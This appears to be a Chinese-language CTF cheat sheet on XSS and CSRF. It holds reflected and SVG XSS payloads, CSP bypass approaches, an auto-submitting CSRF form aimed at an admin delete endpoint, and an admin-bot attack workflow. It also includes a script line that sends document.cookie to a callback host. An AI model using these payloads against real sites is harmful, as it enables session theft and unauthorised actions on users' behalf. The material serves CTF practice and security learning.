# XSS / CSRF

## XSS 探测

```html
<!-- 反射型最简 -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>

<!-- DOM 型：搜 sink -->
location.hash innerHTML eval document.write
```

## CTF 中常见利用

- 偷 cookie：`<script>fetch('http://内网回连/?c='+document.cookie)</script>`
- bot 自动访问 admin → 用 XSS 拿 admin cookie / 触发后台操作
- CSP 绕过：找 unsafe-inline、白名单 CDN、JSONP
- 上传 SVG → SVG 内嵌 `<script>`，或带 `<foreignObject>`

## CSP 速查

```bash
curl -sI http://target/ | grep -i Content-Security-Policy
```

| CSP 关键 | 利用思路 |
|---|---|
| `default-src 'self'` | 找 self 内可控文件，如上传或 XSS sink |
| `script-src 'unsafe-inline'` | 直接内嵌 |
| 白名单 CDN | 找 CDN 上的 JSONP 或 AngularJS payload |
| `script-src 'nonce-xxx'` | 通常很难绕，找 dangling markup |

## CSRF

CTF 中 CSRF 通常配合 XSS / SSRF：
```html
<form action="http://target/admin/delete" method="POST">
  <input name="id" value="1">
</form>
<script>document.forms[0].submit()</script>
```

防御绕过：
- 漏配的 SameSite=None 配合 https
- Origin/Referer 可控（如指向 self-hosted）
- POST → GET 兼容时直接 GET 触发
- JSON CSRF：换成 `text/plain` Content-Type 让浏览器不发 preflight

## 通过 admin bot 触发的题型

题面常见"admin 会访问你的链接"：
1. 准备一个恶意页面（自建 web 服务）：用 `bg_run python3 -m http.server 8000`
2. 让 admin 访问 `http://your-ip:8000/x.html`
3. x.html 里用 fetch / form 触发目标站点的敏感操作
4. 通过 OOB / DNSLog 拿数据回来
